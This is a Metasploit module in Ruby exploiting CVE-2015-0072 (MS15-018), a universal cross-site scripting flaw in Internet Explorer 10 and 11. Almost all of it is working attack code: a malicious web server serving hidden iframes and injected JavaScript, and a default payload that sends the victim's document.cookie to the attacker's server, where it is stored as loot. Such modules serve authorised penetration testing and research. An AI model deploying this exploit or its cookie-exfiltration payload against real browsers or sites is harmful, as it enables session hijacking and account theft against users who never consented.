##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection",
      'Description'    => %q{
          This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet
          Explorer 10 and 11. By default, you will steal the cookie from TARGET_URI (which cannot
          have X-Frame-Options or it will fail). You can also have your own custom JavaScript
          by setting the CUSTOMJS option. Lastly, you might need to configure the URIHOST option if
          you are behind NAT.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'David Leo',      # Original discovery
          'filedescriptor', # PoC
          'joev',           # He figured it out really
          'sinn3r'          # MSF
        ],
      'References'     =>
        [
          [ 'CVE', '2015-0072' ],
          [ 'OSVDB', '117876' ],
          [ 'MSB', 'MS15-018' ],
          [ 'URL', 'http://innerht.ml/blog/ie-uxss.html' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Feb/10' ]
        ],
      'Platform'       => 'win',
      'DisclosureDate' => "Feb 1 2015"
    ))

    register_options(
    [
      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
      OptString.new('CUSTOMJS', [ false, 'Custom JavaScript' ])
    ])
  end

  def setup
    if target_uri !~ /^http/i
      raise Msf::OptionValidateError.new(['TARGET_URI'])
    end

    super
  end

  def target_uri
    datastore['TARGET_URI']
  end

  def get_html
    @html ||= html
  end

  def ninja_cookie_stealer_name
    @ninja ||= "#{Rex::Text.rand_text_alpha(5)}.php"
  end

  def get_uri(cli=self.cli)
    ssl = datastore["SSL"]
    proto = (ssl ? "https://" : "http://")
    if datastore['URIHOST']
      host = datastore['URIHOST']
    elsif (cli and cli.peerhost)
      host = Rex::Socket.source_address(cli.peerhost)
    else
      host = srvhost_addr
    end

    if Rex::Socket.is_ipv6?(host)
      host = "[#{host}]"
    end

    if datastore['URIPORT']
      port = ':' + datastore['URIPORT'].to_s
    elsif (ssl and datastore["SRVPORT"] == 443)
      port = ''
    elsif (!ssl and datastore["SRVPORT"] == 80)
      port = ''
    else
      port = ":" + datastore["SRVPORT"].to_s
    end

    uri = proto + host + port + get_resource

    uri
  end

  def server_uri
    @server_uri ||= get_uri
  end

  def js
    datastore['CUSTOMJS'] || %Q|var e = document.createElement('img'); e.src='#{server_uri}/#{ninja_cookie_stealer_name}?data=' + encodeURIComponent(document.cookie);|
  end

  def html
    %Q|
<iframe style="display:none" src="#{get_resource}/redirect.php"></iframe>
<iframe style="display:none" src="#{datastore['TARGET_URI']}"></iframe>
<script>
    window.onmessage = function(e){ top[1].postMessage(atob("#{Rex::Text.encode_base64(js)}"),"*"); };
    var payload = 'window.onmessage=function(e){ setTimeout(e.data); }; top.postMessage(\\\\"\\\\",\\\\"*\\\\")';
    top[0].eval('_=top[1];with(new XMLHttpRequest)open("get","#{get_resource}/sleep.php",false),send();_.location="javascript:%22%3Cscript%3E'+ encodeURIComponent(payload) +'%3C%2Fscript%3E%22"');
</script>
    |
  end

  def run
    exploit
  end

  def extract_cookie(uri)
    Rex::Text.uri_decode(uri.to_s.scan(/#{ninja_cookie_stealer_name}\?data=(.+)/).flatten[0].to_s)
  end

  def on_request_uri(cli, request)
    case request.uri
    when /redirect\.php/
      print_status("Sending redirect")
      send_redirect(cli, "#{datastore['TARGET_URI']}")
    when /sleep\.php/
      sleep(3)
      send_response(cli, '')
    when /#{ninja_cookie_stealer_name}/
      data = extract_cookie(request.uri)
      if data.blank?
        print_status("The XSS worked, but no cookie")
      else
        print_status("Got cookie")
        print_line(data)
        report_note(
          :host => cli.peerhost,
          :type => 'ie.cookie',
          :data => data
        )
        path = store_loot('ie_uxss_cookie', "text/plain", cli.peerhost, data, "#{cli.peerhost}_ie_cookie.txt", "IE Cookie")
        vprint_good("Cookie stored as: #{path}")
      end
    else
      print_status("Sending HTML")
      send_response(cli, get_html)
    end
  end
end
